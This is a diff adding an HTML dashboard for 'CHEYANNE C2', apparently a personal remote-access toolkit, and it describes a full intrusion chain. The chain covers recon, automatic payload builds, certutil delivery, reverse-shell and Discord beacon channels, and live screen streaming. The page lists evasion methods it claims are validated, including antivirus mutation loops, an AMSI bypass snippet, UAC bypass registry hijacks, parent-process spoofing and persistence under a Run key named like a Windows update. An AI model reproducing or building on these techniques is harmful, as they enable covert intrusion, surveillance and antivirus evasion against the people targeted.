@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CHEYANNE C2 — Operation Flow</title>
+<style>
+  :root {
+    --bg:      #0a0c0e;
+    --bg2:     #111418;
+    --bg3:     #181d22;
+    --green:   #00ff41;
+    --green2:  #00cc33;
+    --amber:   #ffb000;
+    --red:     #ff4444;
+    --blue:    #4488ff;
+    --pink:    #ff2d8a;
+    --cyan:    #00e5ff;
+    --dim:     #555;
+    --muted:   #888;
+    --text:    #ccc;
+    --white:   #fff;
+    --border:  #1e2830;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Courier New', monospace;
+    min-height: 100vh;
+    padding: 40px 20px;
+  }
+  .scanlines {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none; z-index: 1000;
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 48px;
+    padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+  }
+  .logo {
+    font-size: 11px;
+    color: var(--green);
+    line-height: 1.15;
+    letter-spacing: 0.05em;
+    white-space: pre;
+    display: inline-block;
+    text-shadow: 0 0 20px rgba(0,255,65,0.4);
+  }
+  .tagline {
+    color: var(--amber);
+    font-size: 13px;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    margin-top: 12px;
+    opacity: 0.8;
+  }
+  .sub-tagline {
+    color: var(--dim);
+    font-size: 11px;
+    margin-top: 6px;
+    letter-spacing: 0.15em;
+  }
+
+  /* ── KILL CHAIN FLOW ── */
+  .chain-wrapper {
+    max-width: 1100px;
+    margin: 0 auto 60px;
+  }
+  .section-title {
+    font-size: 10px;
+    letter-spacing: 0.5em;
+    text-transform: uppercase;
+    color: var(--dim);
+    margin-bottom: 20px;
+    padding-left: 4px;
+  }
+  .kill-chain {
+    display: flex;
+    gap: 0;
+    align-items: stretch;
+    justify-content: center;
+    flex-wrap: nowrap;
+  }
+  .chain-node {
+    flex: 1;
+    min-width: 130px;
+    max-width: 170px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-right: none;
+    padding: 20px 14px 18px;
+    position: relative;
+    transition: border-color 0.2s;
+  }
+  .chain-node:first-child  { border-radius: 8px 0 0 8px; }
+  .chain-node:last-child   { border-right: 1px solid var(--border); border-radius: 0 8px 8px 0; }
+  .chain-node:hover { border-color: var(--green); }
+  .chain-node::after {
+    content: '';
+    position: absolute;
+    right: -14px; top: 50%; transform: translateY(-50%);
+    width: 0; height: 0;
+    border-top: 14px solid transparent;
+    border-bottom: 14px solid transparent;
+    border-left: 14px solid var(--border);
+    z-index: 2;
+  }
+  .chain-node:last-child::after { display: none; }
+  .chain-node:hover::after { border-left-color: var(--green); }
+
+  .node-step   { font-size: 9px; letter-spacing: 0.4em; text-transform: uppercase; color: var(--dim); margin-bottom: 8px; }
+  .node-key    { font-size: 22px; font-weight: bold; color: var(--green); margin-bottom: 4px; }
+  .node-title  { font-size: 12px; font-weight: bold; color: var(--white); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.08em; }
+  .node-desc   { font-size: 10px; color: var(--muted); line-height: 1.6; }
+  .node-status { margin-top: 12px; font-size: 9px; letter-spacing: 0.2em; }
+  .status-ok   { color: var(--green); }
+  .status-pend { color: var(--amber); }
+
+  .node-recon  .node-key { color: var(--cyan); }
+  .node-import .node-key { color: var(--cyan); }
+  .node-build  .node-key { color: var(--green); }
+  .node-deploy .node-key { color: var(--red); }
+  .node-watch  .node-key { color: var(--pink); }
+
+  /* ── COMPONENT TABLE ── */
+  .two-col {
+    max-width: 1100px;
+    margin: 0 auto 60px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+  @media (max-width: 720px) { .two-col { grid-template-columns: 1fr; } }
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 24px;
+  }
+  .card-title {
+    font-size: 10px; letter-spacing: 0.5em; text-transform: uppercase;
+    margin-bottom: 18px; padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+  .card-title.green  { color: var(--green); }
+  .card-title.amber  { color: var(--amber); }
+  .card-title.red    { color: var(--red); }
+  .card-title.pink   { color: var(--pink); }
+  .card-title.cyan   { color: var(--cyan); }
+  .card-title.blue   { color: var(--blue); }
+
+  .component-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+    margin-bottom: 16px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .component-row:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+  .comp-badge {
+    flex-shrink: 0;
+    width: 34px; height: 34px;
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: bold;
+    background: rgba(0,255,65,0.08);
+    color: var(--green);
+    border: 1px solid rgba(0,255,65,0.2);
+  }
+  .comp-badge.amber { background: rgba(255,176,0,0.08); color: var(--amber); border-color: rgba(255,176,0,0.2); }
+  .comp-badge.red   { background: rgba(255,68,68,0.08); color: var(--red);   border-color: rgba(255,68,68,0.2); }
+  .comp-badge.pink  { background: rgba(255,45,138,0.08); color: var(--pink); border-color: rgba(255,45,138,0.2); }
+  .comp-badge.cyan  { background: rgba(0,229,255,0.08);  color: var(--cyan); border-color: rgba(0,229,255,0.2); }
+  .comp-badge.blue  { background: rgba(68,136,255,0.08); color: var(--blue); border-color: rgba(68,136,255,0.2); }
+
+  .comp-info {}
+  .comp-name { font-size: 12px; font-weight: bold; color: var(--white); margin-bottom: 3px; }
+  .comp-file { font-size: 10px; color: var(--dim); margin-bottom: 4px; font-family: monospace; }
+  .comp-desc { font-size: 11px; color: var(--muted); line-height: 1.5; }
+
+  /* ── BYPASS TECHNIQUES ── */
+  .techniques {
+    max-width: 1100px;
+    margin: 0 auto 60px;
+  }
+  .tech-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+  }
+  @media (max-width: 900px) { .tech-grid { grid-template-columns: 1fr 1fr; } }
+  @media (max-width: 600px) { .tech-grid { grid-template-columns: 1fr; } }
+
+  .tech-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 18px 16px;
+  }
+  .tech-badge {
+    display: inline-block;
+    font-size: 9px; letter-spacing: 0.3em; text-transform: uppercase;
+    padding: 3px 8px; border-radius: 3px;
+    margin-bottom: 12px;
+    font-weight: bold;
+  }
+  .badge-green  { background: rgba(0,255,65,0.12);   color: var(--green);  border: 1px solid rgba(0,255,65,0.25); }
+  .badge-amber  { background: rgba(255,176,0,0.12);  color: var(--amber);  border: 1px solid rgba(255,176,0,0.25); }
+  .badge-red    { background: rgba(255,68,68,0.12);  color: var(--red);    border: 1px solid rgba(255,68,68,0.25); }
+  .badge-pink   { background: rgba(255,45,138,0.12); color: var(--pink);   border: 1px solid rgba(255,45,138,0.25); }
+  .badge-cyan   { background: rgba(0,229,255,0.12);  color: var(--cyan);   border: 1px solid rgba(0,229,255,0.25); }
+
+  .tech-name   { font-size: 13px; font-weight: bold; color: var(--white); margin-bottom: 6px; }
+  .tech-desc   { font-size: 11px; color: var(--muted); line-height: 1.6; margin-bottom: 10px; }
+  .tech-code   {
+    font-size: 9px; color: var(--green2); background: var(--bg);
+    padding: 8px 10px; border-radius: 4px; border-left: 2px solid var(--green);
+    line-height: 1.7; word-break: break-all;
+    font-family: 'Courier New', monospace;
+  }
+
+  /* ── TEST RESULTS ── */
+  .test-table {
+    max-width: 1100px;
+    margin: 0 auto 60px;
+  }
+  .test-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 12px;
+  }
+  @media (max-width: 800px) { .test-grid { grid-template-columns: 1fr 1fr; } }
+  .test-item {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 14px;
+    text-align: center;
+  }
+  .test-item.pass { border-color: rgba(0,255,65,0.3); }
+  .test-item.fail { border-color: rgba(255,68,68,0.3); }
+  .test-icon { font-size: 22px; margin-bottom: 8px; }
+  .test-item.pass .test-icon { color: var(--green); }
+  .test-item.fail .test-icon { color: var(--red); }
+  .test-name { font-size: 10px; color: var(--white); font-weight: bold; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 4px; }
+  .test-detail { font-size: 9px; color: var(--dim); line-height: 1.5; }
+
+  /* ── FOOTER ── */
+  .footer {
+    max-width: 1100px;
+    margin: 60px auto 0;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .footer-left  { font-size: 10px; color: var(--dim); line-height: 2; }
+  .footer-right { font-size: 10px; color: var(--dim); text-align: right; }
+  .footer a { color: var(--green); text-decoration: none; }
+
+  /* animations */
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+  .blink { animation: pulse 2s ease-in-out infinite; }
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+
+<!-- ── HEADER ── -->
+<div class="header">
+  <pre class="logo">  ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
+ ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
+ ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
+ ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
+ ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
+  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝</pre>
+  <div class="tagline">Operator: VADER &nbsp;·&nbsp; Callsign: 22DIV &nbsp;·&nbsp; CSEC Research Platform</div>
+  <div class="sub-tagline">Authorized use: own hardware only &nbsp;·&nbsp; MSRC VULN-195458 &nbsp;·&nbsp; own machine validated 8/8 PASS</div>
+</div>
+
+<!-- ── KILL CHAIN ── -->
+<div class="chain-wrapper">
+  <div class="section-title">// KILL CHAIN — operation flow</div>
+  <div class="kill-chain">
+
+    <div class="chain-node node-recon">
+      <div class="node-step">Phase 0</div>
+      <div class="node-key">[Q]</div>
+      <div class="node-title">Drop Recon</div>
+      <div class="node-desc">Run recon_drop.ps1 on target. JSON output: AV, admin, UAC, arch, listening ports, privesc candidates.</div>
+      <div class="node-status status-ok">● READY</div>
+    </div>
+
+    <div class="chain-node node-import">
+      <div class="node-step">Phase 1</div>
+      <div class="node-key">[I]</div>
+      <div class="node-title">Import Recon</div>
+      <div class="node-desc">Load chey_recon.json. Auto-select payload strategy: FUD level, privesc method, arch.</div>
+      <div class="node-status status-ok">● READY</div>
+    </div>
+
+    <div class="chain-node node-build">
+      <div class="node-step">Phase 2</div>
+      <div class="node-key">[B]</div>
+      <div class="node-title">Auto Build</div>
+      <div class="node-desc">payload_auto.py chains: ghost_loader_v3 + privesc PS1 + FUD mutation → ghost_fud.exe per target.</div>
+      <div class="node-status status-ok">● READY</div>
+    </div>
+
+    <div class="chain-node node-deploy">
+      <div class="node-step">Phase 3</div>
+      <div class="node-key">[P]</div>
+      <div class="node-title">Deploy</div>
+      <div class="node-desc">Phase 0: file server :8890 + C2 listener :4443. Target: certutil download + start /B (CMD-safe).</div>
+      <div class="node-status status-ok">● 8/8 LOCAL PASS</div>
+    </div>
+
+    <div class="chain-node node-watch">
+      <div class="node-step">Phase 4</div>
+      <div class="node-key">[W]</div>
+      <div class="node-title">Watch / VNC</div>
+      <div class="node-desc">watch_stream.py polls "screen" cmd every 2s. JPEG frames → browser :8892. [SCR]b64jpeg[/SCR] protocol.</div>
+      <div class="node-status status-pend blink">● READY</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ── COMPONENTS ── -->
+<div class="two-col">
+
+  <div class="card">
+    <div class="card-title cyan">// Recon &amp; Intelligence</div>
+
+    <div class="component-row">
+      <div class="comp-badge cyan">Q</div>
+      <div class="comp-info">
+        <div class="comp-name">recon_drop.ps1</div>
+        <div class="comp-file">recon/recon_drop.ps1</div>
+        <div class="comp-desc">Comprehensive JSON recon: hostname, OS build, PS version, .NET, admin bit, UAC level, AV processes (8 vendors), Defender realtime, local users, admin group, listening ports, privesc candidates. Output to %TEMP%\chey_recon.json.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge cyan">I</div>
+      <div class="comp-info">
+        <div class="comp-name">Import Recon</div>
+        <div class="comp-file">vader_menu.py → _import_recon()</div>
+        <div class="comp-desc">Copies recon JSON → recon/last_imported.json. Shows strategy summary: FUD level, privesc method, arch. Feeds payload_auto.py.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge blue">K</div>
+      <div class="comp-info">
+        <div class="comp-name">LAN Scanner</div>
+        <div class="comp-file">vader_menu.py → _scan_lan()</div>
+        <div class="comp-desc">TCP connect to ports 445/135/22/80 across /24 subnet. ThreadPoolExecutor(64), 0.5s timeout. No nmap required. Auto-labels Radon (192.168.1.145) and own IP.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title green">// Payload &amp; Build</div>
+
+    <div class="component-row">
+      <div class="comp-badge">B</div>
+      <div class="comp-info">
+        <div class="comp-name">payload_auto.py</div>
+        <div class="comp-file">payload_auto.py</div>
+        <div class="comp-desc">Auto-builds ghost_fud.exe from recon JSON. Chains: ghost_loader_v3 compile → optional privesc PS1 → ghost-encode steg → FUD mutation loop (max 5). Outputs to shell/ghost_fud_&lt;hostname&gt;.exe.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge amber">V</div>
+      <div class="comp-info">
+        <div class="comp-name">UAC Bypass Builder</div>
+        <div class="comp-file">payload_auto.py → build_privesc_ps1()</div>
+        <div class="comp-desc">4 methods: fodhelper, eventvwr, sdclt, computerdefaults. All use registry hijack → Start-Process -Wait → cleanup. Auto-selected from recon OS build + admin status.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge red">Z</div>
+      <div class="comp-info">
+        <div class="comp-name">FUD Auto Loop</div>
+        <div class="comp-file">fud_auto.py</div>
+        <div class="comp-desc">Metamorphic mutation + Kaspersky scan loop. Runs until CLEAN or max iterations. Per-build random junk, variable renames, string XOR. Currently: seed=66728 CLEAN.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title red">// C2 &amp; Delivery</div>
+
+    <div class="component-row">
+      <div class="comp-badge red">D</div>
+      <div class="comp-info">
+        <div class="comp-name">Dual-Channel C2</div>
+        <div class="comp-file">shell/vader_c2_v2.py + agent/svchost_update.exe</div>
+        <div class="comp-desc">TCP shell (ghost_loader.exe → port 4443) + Discord beacon (heartbeat every 600s). Both channels persist independently. TCP handles interactive commands; Discord handles delivery + recon.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge red">A</div>
+      <div class="comp-info">
+        <div class="comp-name">Auto Op</div>
+        <div class="comp-file">auto_op.py</div>
+        <div class="comp-desc">Full automated kill chain: scan Discord beacons → build → start file server → TCP listener → deliver via Discord CMD → wait TCP callback → recon → persist. Zero manual steps.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge amber">R</div>
+      <div class="comp-info">
+        <div class="comp-name">TCP Reconnect</div>
+        <div class="comp-file">vader_menu.py → _tcp_reconnect_via_discord()</div>
+        <div class="comp-desc">Re-deliver ghost_loader to existing beacon without rebuilding. Starts file server + C2 listener, sends certutil download cmd via beacon channel.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title pink">// Watch &amp; Operate</div>
+
+    <div class="component-row">
+      <div class="comp-badge pink">W</div>
+      <div class="comp-info">
+        <div class="comp-name">Watch / VNC Stream</div>
+        <div class="comp-file">watch_stream.py</div>
+        <div class="comp-desc">HTTP server :8892. Dark-mode browser UI with LIVE indicator. Background daemon polls "screen" cmd every 2s over TCP shell. [SCR]base64jpeg[/SCR] protocol. Auto-opens browser on launch.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge green">N</div>
+      <div class="comp-info">
+        <div class="comp-name">Live Recon (TCP)</div>
+        <div class="comp-file">ghost_encode.py → make_reverse_shell_ps()</div>
+        <div class="comp-desc">Shell command "recon" returns JSON: hostname, username, admin bit, OS caption, PS version, PID, IP. [RECON]JSON[/RECON] protocol. Runs inside active TCP session.</div>
+      </div>
+    </div>
+
+    <div class="component-row">
+      <div class="comp-badge">T</div>
+      <div class="comp-info">
+        <div class="comp-name">Full Test Suite</div>
+        <div class="comp-file">test_auto_full.py / test_local_chain.py</div>
+        <div class="comp-desc">test_local_chain.py: 8/8 PASS — TCP arm → payload launch → callback → whoami → hostname → computername → persist → verify. test_auto_full.py adds LAN scan + FUD check + beacon check.</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ── BYPASS TECHNIQUES ── -->
+<div class="techniques">
+  <div class="section-title">// BYPASS TECHNIQUES — implemented &amp; validated</div>
+  <div class="tech-grid">
+
+    <div class="tech-card">
+      <span class="tech-badge badge-green">CONFIRMED</span>
+      <div class="tech-name">AMSI Bypass — Split Type Names</div>
+      <div class="tech-desc">Prevents AMSI raw-string signature scan from matching <code>[Net.Sockets.TcpClient]</code> literal. Used in reverse shell PS1.</div>
+      <div class="tech-code">$T1='Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'<br>$c=New-Object -T $T1 -A ($h,$p)</div>
+    </div>
+
+    <div class="tech-card">
+      <span class="tech-badge badge-green">CONFIRMED</span>
+      <div class="tech-name">Zero-Width Unicode Steganography</div>
+      <div class="tech-desc">Entire PS1 payload encoded as zero-width chars using 16-char Ghost Alphabet. Visible bootstrap = 4 clean lines. No suspicious strings visible.</div>
+      <div class="tech-code">GHOST_ALPHABET = [<br>&nbsp;&nbsp;'​','‌',<br>&nbsp;&nbsp;'‍','⁠',…<br>] # 16 chars = 4 bits each</div>
+    </div>
+
+    <div class="tech-card">
+      <span class="tech-badge badge-green">CLEAN</span>
+      <div class="tech-name">Ghost Loader v3 — Parent Spoof</div>
+      <div class="tech-desc">PROC_THREAD_ATTRIBUTE_PARENT_PROCESS makes PS appear as explorer.exe child. XOR-encrypted payload in C binary. Kaspersky 0/1 detection (seed=66728).</div>
+      <div class="tech-code">STARTUPINFOEX si = {0};<br>UpdateProcThreadAttribute(<br>&nbsp;&nbsp;…PARENT_PROCESS, &amp;hParent…<br>);</div>
+    </div>
+
+    <div class="tech-card">
+      <span class="tech-badge badge-amber">READY</span>
+      <div class="tech-name">UAC Bypass — fodhelper</div>
+      <div class="tech-desc">ms-settings DelegateExecute + shell\open\command registry hijack. Spawns elevated process via COM autoElevate. Auto-cleanup after use.</div>
+      <div class="tech-code">HKCU:\…\ms-settings\Shell\<br>&nbsp;&nbsp;Open\command\(Default)<br>= "powershell -W Hidden …"</div>
+    </div>
+
+    <div class="tech-card">
+      <span class="tech-badge badge-amber">READY</span>
+      <div class="tech-name">UAC Bypass — eventvwr</div>
+      <div class="tech-desc">Windows 7–10 SYSTEM. mscfile shell\open\command hijack via Event Viewer autoElevate COM object. Very stable across Win10 builds.</div>
+      <div class="tech-code">HKCU:\Software\Classes\<br>&nbsp;&nbsp;mscfile\shell\open\command<br>= "powershell -W Hidden …"</div>
+    </div>
+
+    <div class="tech-card">
+      <span class="tech-badge badge-pink">CONFIRMED</span>
+      <div class="tech-name">Persistence — HKCU Run Keys</div>
+      <div class="tech-desc">User-level registry persistence. No admin required. Survives reboot. Validated in test_local_chain.py 8/8 PASS. Key: WindowsSecurityUpdate.</div>
+      <div class="tech-code">HKCU:\Software\Microsoft\<br>&nbsp;&nbsp;Windows\CurrentVersion\Run<br>  WindowsSecurityUpdate</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ── TEST RESULTS ── -->
+<div class="test-table">
+  <div class="section-title">// LOCAL KILL CHAIN — test_local_chain.py 2026-06-25</div>
+  <div class="test-grid">
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">TCP Armed</div>
+      <div class="test-detail">Listener :4443 ready</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">Payload Launch</div>
+      <div class="test-detail">PS via -EncodedCommand</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">TCP Callback</div>
+      <div class="test-detail">127.0.0.1:60363 banner=OK</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">whoami</div>
+      <div class="test-detail">gwu07 returned</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">hostname</div>
+      <div class="test-detail">LAPTOP-R32M8MLI</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">$env:COMPUTERNAME</div>
+      <div class="test-detail">LAPTOP-R32M8MLI</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">Persist Set</div>
+      <div class="test-detail">HKCU Run key written</div>
+    </div>
+    <div class="test-item pass">
+      <div class="test-icon">✓</div>
+      <div class="test-name">Persist Verified</div>
+      <div class="test-detail">Registry key confirmed</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── FOOTER ── -->
+<div class="footer">
+  <div class="footer-left">
+    CHEYANNE C2 &nbsp;·&nbsp; CSEC Research Platform<br>
+    Operator: VADER (George Wu) &nbsp;·&nbsp; 22DIV<br>
+    Authorized: own hardware only (George's machines, Raed's machine)
+  </div>
+  <div class="footer-right">
+    MSRC VULN-195458<br>
+    <a href="https://github.com/rainfantry/cheyanne">github.com/rainfantry/cheyanne</a><br>
+    Private repo
+  </div>
+</div>
+
+</body>
+</html>
